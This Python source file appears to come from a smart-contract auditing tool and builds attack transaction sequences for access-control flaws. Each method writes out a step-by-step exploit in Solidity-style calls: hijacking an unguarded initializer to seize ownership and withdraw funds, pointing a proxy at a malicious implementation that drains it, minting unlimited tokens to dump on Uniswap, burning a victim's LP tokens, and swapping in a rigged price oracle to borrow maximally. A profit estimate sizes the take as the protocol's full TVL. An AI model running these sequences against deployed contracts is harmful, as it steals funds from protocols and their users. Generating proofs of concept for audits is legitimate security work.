"""
AccessControlSequenceBuilder — Phase 4.

Converts ACCESS_CONTROL hypotheses into transaction sequences.

Handles:
  - Front-run initializer (initialize() without guard)
  - Upgrade takeover (upgradeTo() without guard)
  - Unbounded mint/burn
  - Oracle substitution (setOracle())
  - Generic unprotected admin calls
"""

from __future__ import annotations

from zeropath.adversarial.models import AttackClass, AttackHypothesis
from zeropath.models import ProtocolGraph
from zeropath.sequencer.base import BaseSequenceBuilder
from zeropath.sequencer.models import (
    AttackContext,
    CallerType,
    ProfitEstimate,
    TxCall,
)


class AccessControlSequenceBuilder(BaseSequenceBuilder):
    """Builds transaction sequences for access control attacks."""

    attack_class = AttackClass.ACCESS_CONTROL

    def _build_calls(
        self,
        hypothesis: AttackHypothesis,
        graph: ProtocolGraph,
    ) -> list[TxCall]:
        title_lower = hypothesis.title.lower()
        target_contract = (hypothesis.contracts_involved or ["Target"])[0]
        target_fn = (hypothesis.functions_involved or ["initialize"])[0]

        if "initialize" in title_lower or "front-run" in title_lower:
            return self._frontrun_init(hypothesis, target_contract, target_fn)
        if "upgrade" in title_lower:
            return self._upgrade_takeover(hypothesis, target_contract, target_fn)
        if "mint" in title_lower:
            return self._unbounded_mint(hypothesis, target_contract, target_fn)
        if "burn" in title_lower:
            return self._unbounded_burn(hypothesis, target_contract, target_fn)
        if "oracle" in title_lower:
            return self._oracle_substitution(hypothesis, target_contract, target_fn)
        return self._generic_unprotected(hypothesis, target_contract, target_fn)

    def _frontrun_init(self, hypothesis, target_contract, target_fn) -> list[TxCall]:
        return [
            self._call(
                step=1,
                description="Monitor mempool for proxy deployment transaction",
                target="/* mempool monitoring — off-chain */",
                sig=None,
                caller=CallerType.ATTACKER_EOA,
                pre=[
                    "// In real attack: watch for CREATE2 deploy of proxy in mempool",
                    "// Then submit initialize() with higher gas before deployer",
                    f"// For PoC: simply call {target_fn}() on already-deployed target",
                ],
                gas=21_000,
            ),
            self._call(
                step=2,
                description=f"Call {target_fn}() setting attacker as owner/admin",
                target=f"I{target_contract}(/* {target_contract} address */)",
                sig=f"{target_fn}(address)",
                calldata="address(this)  // attacker becomes owner",
                caller=CallerType.ATTACKER_EOA,
                post=[
                    f"assertEq(I{target_contract}(TARGET).owner(), address(this), 'Not owner after init');",
                ],
                gas=200_000,
            ),
            self._call(
                step=3,
                description="Use owner access to drain funds or pause protocol",
                target=f"I{target_contract}(/* {target_contract} address */)",
                sig="withdrawAll(address)",
                calldata="address(this)",
                caller=CallerType.ATTACKER_EOA,
                post=[
                    "assertGt(address(this).balance, 0, 'No funds drained via ownership');",
                ],
                gas=100_000,
            ),
        ]

    def _upgrade_takeover(self, hypothesis, target_contract, target_fn) -> list[TxCall]:
        return [
            self._call(
                step=1,
                description="Deploy MaliciousImplementation with drain() function",
                target="/* deploy new MaliciousImpl() */",
                sig=None,
                caller=CallerType.ATTACKER_EOA,
                pre=["uint256 targetBalance = address(TARGET).balance;"],
                gas=400_000,
            ),
            self._call(
                step=2,
                description=f"Call {target_fn}(maliciousImpl) — no access control",
                target=f"I{target_contract}(/* {target_contract} address */)",
                sig=f"{target_fn}(address)",
                calldata="address(maliciousImpl)",
                caller=CallerType.ATTACKER_EOA,
                post=[
                    "// Proxy implementation slot now points to attacker's contract",
                ],
                gas=100_000,
            ),
            self._call(
                step=3,
                description="Call drain() on proxy — executes in proxy's storage/balance context",
                target=f"I{target_contract}(/* {target_contract} address */)",
                sig="drain(address)",
                calldata="payable(address(this))",
                caller=CallerType.ATTACKER_EOA,
                post=[
                    "assertEq(address(TARGET).balance, 0, 'Target not fully drained');",
                    "assertGt(address(this).balance, targetBalance, 'Attacker did not receive funds');",
                ],
                gas=200_000,
            ),
        ]

    def _unbounded_mint(self, hypothesis, target_contract, target_fn) -> list[TxCall]:
        return [
            self._call(
                step=1,
                description=f"Call {target_fn}(attacker, max) — no MINTER_ROLE check",
                target=f"I{target_contract}(/* {target_contract} address */)",
                sig=f"{target_fn}(address,uint256)",
                calldata="address(this), type(uint256).max",
                caller=CallerType.ATTACKER_EOA,
                post=[
                    "assertEq(IERC20(TARGET).balanceOf(address(this)), type(uint256).max, 'Mint failed');",
                ],
                gas=80_000,
            ),
            self._call(
                step=2,
                description="Dump minted tokens on Uniswap for ETH/USDC",
                target="IUniswapV2Router02(/* Uniswap router */)",
                sig="swapExactTokensForETH(uint256,uint256,address[],address,uint256)",
                calldata=(
                    "type(uint256).max, 0, path, address(this), block.timestamp"
                ),
                caller=CallerType.ATTACKER_EOA,
                post=[
                    "assertGt(address(this).balance, 0, 'Swap to ETH failed');",
                ],
                gas=300_000,
            ),
        ]

    def _unbounded_burn(self, hypothesis, target_contract, target_fn) -> list[TxCall]:
        return [
            self._call(
                step=1,
                description="Identify victim with largest token balance",
                target="/* off-chain: query balanceOf for all token holders */",
                sig=None,
                caller=CallerType.ATTACKER_EOA,
                pre=["address victim = /* address with most LP tokens */;"],
                gas=21_000,
            ),
            self._call(
                step=2,
                description=f"Call {target_fn}(victim, amount) — burns victim's tokens",
                target=f"I{target_contract}(/* {target_contract} address */)",
                sig=f"{target_fn}(address,uint256)",
                calldata="victim, IERC20(TARGET).balanceOf(victim)",
                caller=CallerType.ATTACKER_EOA,
                post=[
                    "assertEq(IERC20(TARGET).balanceOf(victim), 0, 'Burn failed');",
                    "// Victim LP tokens burned → victim cannot withdraw liquidity",
                ],
                gas=100_000,
            ),
        ]

    def _oracle_substitution(self, hypothesis, target_contract, target_fn) -> list[TxCall]:
        return [
            self._call(
                step=1,
                description="Deploy MaliciousOracle returning attacker-controlled price",
                target="/* deploy new MaliciousOracle() */",
                sig=None,
                caller=CallerType.ATTACKER_EOA,
                pre=["// MaliciousOracle.latestAnswer() returns type(int256).max"],
                gas=300_000,
            ),
            self._call(
                step=2,
                description=f"Call {target_fn}(maliciousOracle) — replace legitimate price feed",
                target=f"I{target_contract}(/* {target_contract} address */)",
                sig=f"{target_fn}(address)",
                calldata="address(maliciousOracle)",
                caller=CallerType.ATTACKER_EOA,
                post=[
                    "// Protocol now reads from attacker-controlled oracle",
                ],
                gas=80_000,
            ),
            self._call(
                step=3,
                description="Borrow maximum against inflated collateral price",
                target=f"I{target_contract}(/* {target_contract} address */)",
                sig="borrow(address,uint256,uint256,address)",
                calldata="WETH, type(uint256).max, 2, address(this)",
                caller=CallerType.ATTACKER_EOA,
                post=[
                    "assertGt(IERC20(WETH).balanceOf(address(this)), 0, 'Borrow via oracle subst failed');",
                ],
                gas=300_000,
            ),
        ]

    def _generic_unprotected(self, hypothesis, target_contract, target_fn) -> list[TxCall]:
        return [
            self._call(
                step=1,
                description=f"Call unprotected {target_fn}() directly",
                target=f"I{target_contract}(/* {target_contract} address */)",
                sig=f"{target_fn}(/* TODO: params */)",
                calldata="/* TODO: appropriate arguments */",
                caller=CallerType.ATTACKER_EOA,
                post=[
                    f"// Confirm {target_fn} executed without revert",
                    "// Verify resulting state change is exploitable",
                ],
                gas=200_000,
            ),
            self._call(
                step=2,
                description="Extract value using new privileged state",
                target=f"I{target_contract}(/* {target_contract} address */)",
                sig="withdraw(uint256)",
                calldata="type(uint256).max",
                caller=CallerType.ATTACKER_EOA,
                post=[
                    "assertGt(address(this).balance + IERC20(TOKEN).balanceOf(address(this)), 0, 'No profit');",
                ],
                gas=200_000,
            ),
        ]

    def _build_context(self, hypothesis, graph) -> AttackContext:
        ctx = super()._build_context(hypothesis, graph)
        ctx.requires_attacker_contract = False  # access control attacks usually need just EOA
        ctx.attacker_eth_balance = "1 ether"  # gas money
        return ctx

    def _build_profit_estimate(self, hypothesis) -> ProfitEstimate | None:
        return ProfitEstimate(
            asset="ETH/ERC20",
            min_profit_expression="address(TARGET).balance",
            max_profit_expression="/* full protocol TVL */",
            cost_expression="tx.gasprice * gasleft()",  # gas only — no capital needed
            scales_with_tvl=True,
            notes="Access control attacks often require zero capital — just gas cost.",
        )
